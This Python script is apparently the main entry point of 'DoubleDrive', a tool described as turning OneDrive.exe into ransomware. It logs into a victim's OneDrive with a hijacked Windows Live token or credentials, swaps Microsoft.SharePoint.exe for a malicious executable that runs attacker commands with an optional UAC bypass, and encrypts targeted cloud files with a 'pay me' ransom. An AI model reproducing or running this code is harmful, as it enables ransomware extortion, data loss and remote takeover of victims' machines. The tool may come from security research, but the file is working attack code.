import json
import argparse
import urllib
import requests
import re

from config import get_configs, ConfigKey
from doubledrive.cloud_ransomware.onedrive_ransomware import OneDriveRansomware
from doubledrive.endpoint_takeover_utils.temp_email import TempEmail
from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
from doubledrive.cloud_drive.onedrive.onedrive_item import OneDriveFileItem


def save_token_in_cache(drive_id, token):
    with open(f"{drive_id}.cache", "w") as f:
        return f.write(token)
    

def get_token_from_temp_email():
    temp_email = TempEmail(get_configs()[ConfigKey.TOKEN_DST_EMAIL_ADDRESS.value])
    messages = temp_email.get_messages()
    last_message = messages[0]
    re_match = re.search("\"https://1drv.ms.*?\"", last_message.content)
    url = re_match.group().replace("\"", "")
    html_text= requests.get(url).text
    search_url = "\"https\\\\u003a\\\\u002f\\\\u002fonedrive.live.com.*?\""
    re_match = re.search(search_url, html_text)
    file_url = re_match.group().replace("\"", "").encode('utf-8').decode('unicode_escape')
    file_url_params = urllib.parse.parse_qs(urllib.parse.urlparse(file_url).query)
    onedrive_file_auth_key = file_url_params["authkey"][0]
    onedrive_file_id = file_url_params["id"][0]
    onedrive_file_drive_id = file_url_params["cid"][0]
    onedrive_session = OneDrive()
    windows_live_token = onedrive_session.read_shared_file_content(onedrive_file_drive_id, onedrive_file_id, onedrive_file_auth_key).decode()
    return windows_live_token


def login_according_to_args(args, onedrive_session: OneDrive):
    if args.use_saved_token:
        with open(args.use_saved_token, "r") as f:
            token = f.read()
        onedrive_session.login_using_token(token)
    elif args.use_creds:
        onedrive_session.login_using_creds(args.use_creds[0], args.use_creds[1])
        save_token_in_cache(onedrive_session.get_drive_id(), onedrive_session.get_token())
    else:
        token = get_token_from_temp_email()
        onedrive_session.login_using_token(token)
        save_token_in_cache(onedrive_session.get_drive_id(), token)


def get_target_onedrive_items(onedrive_session: OneDrive):
    all_onedrive_files_to_encrypt = []
    for item in get_configs()[ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value].keys():
        onedrive_junction_item = onedrive_session.get_item_by_path(f"/{item}")
        onedrive_junction_children = onedrive_session.list_children_recursively(onedrive_junction_item)
        items_to_encrypt = [item for item in onedrive_junction_children if isinstance(item, OneDriveFileItem)]
        all_onedrive_files_to_encrypt.extend(items_to_encrypt)

    return all_onedrive_files_to_encrypt


def parse_args():
    parser = argparse.ArgumentParser(description="DoubleDrive - Turns the original OneDrive.exe into a ransomware")
    parser.add_argument("--remote-ransomware", help="If specified, encrypts all the remote files under the directories that were targeted with options_setup.py", action="store_true")
    parser.add_argument("--replace-sharepoint", help="If specified, replaces Microsoft.SharePoint.exe which is part of OneDrive's binaries with an executable that executes attacker's commands", action="store_true")

    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument("--use-saved-token", help="Path to a file that contains a Windows ID Live token to use")
    group.add_argument("--use-creds", nargs=2, help="Path to a file that contains a Windows ID Live token to use")

    parser.add_argument("--run-command", help="A command to pass to the malicious executable that replaces SharePoint's executable on the endpoint")
    parser.add_argument("--command-uac-bypass", help="If specified, first bypasses UAC on the target and then runs the command given in --run-command", action="store_true")
    args = parser.parse_args()
    
    if args.command_uac_bypass and not args.run_command:
        parser.error("--command-uac-bypass cannot be used without --run-command")

    return args


def main():
    args = parse_args()
    configs = get_configs()
    onedrive_session = OneDrive()
    login_according_to_args(args, onedrive_session)

    if args.replace_sharepoint:
        with open("./dist/follow_attacker_commands.exe", "rb") as f:
            malicious_exe = f.read()
        sharepoint_exe_onedrive_item = onedrive_session.get_item_by_path(f"/{configs[ConfigKey.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME.value]}/Microsoft.SharePoint.exe")
        onedrive_session.modify_file_content(sharepoint_exe_onedrive_item, malicious_exe)
    
    if args.run_command:
        cmd_dict = {
            "uac": args.command_uac_bypass,
            "command": args.run_command
        }
        onedrive_session.create_file(f"/{configs[ConfigKey.CMD_FILE_NAME.value]}", json.dumps(cmd_dict).encode(), modify_if_exists=True)

    if args.remote_ransomware:
        onedrive_ransomware = OneDriveRansomware(onedrive_session)
        all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session)
        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, "pay me", quick_delete=configs[ConfigKey.QUICK_DELETE.value])

    


if "__main__" == __name__:
    main()